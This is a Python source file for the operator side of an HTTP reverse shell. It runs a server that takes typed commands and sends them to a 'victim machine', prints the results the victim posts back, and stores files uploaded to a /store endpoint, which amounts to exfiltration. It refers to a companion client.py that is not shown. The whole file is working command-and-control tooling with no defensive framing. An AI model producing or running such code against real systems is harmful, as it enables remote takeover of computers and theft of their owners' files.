import socketserver
import http.server
import cgi
from colorama import Fore, Back, Style

PORT = 8088


class ReverseShell(http.server.BaseHTTPRequestHandler):
    def do_GET(self):

        command = input(Fore.YELLOW + ">> ")

        print(Style.RESET_ALL)

        # boilerplate http
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        # send command to victim machine
        self.wfile.write(command.encode())

    def do_POST(self):
        if self.path == '/store':  # Check whether /store is appended or not

            ctype, _ = cgi.parse_header(
                self.headers['content-type'])
            if ctype == 'multipart/form-data':
                fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={
                    'REQUEST_METHOD': 'POST'})

            # Here file is the key to hold the actual file, same key as the one set in client.py
            fs_up = fs['file']

            # Create new file and write contents into this file
            with open(fs_up.filename, '+wb') as o:
                o.write(fs_up.file.read())
                self.send_response(200)
                self.end_headers()
            return
        self.send_response(200)
        self.end_headers()
        # Define the length which means how many bytes the HTTP POST data contains
        length = int(self.headers['Content-Length'])

        postVar = self.rfile.read(length).decode()

        print(Fore.GREEN + postVar, end='')
        print(Style.RESET_ALL)


with socketserver.TCPServer(("", PORT), ReverseShell) as httpd:
    print(f"serving at port {PORT}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server is terminated")
        httpd.server_close()
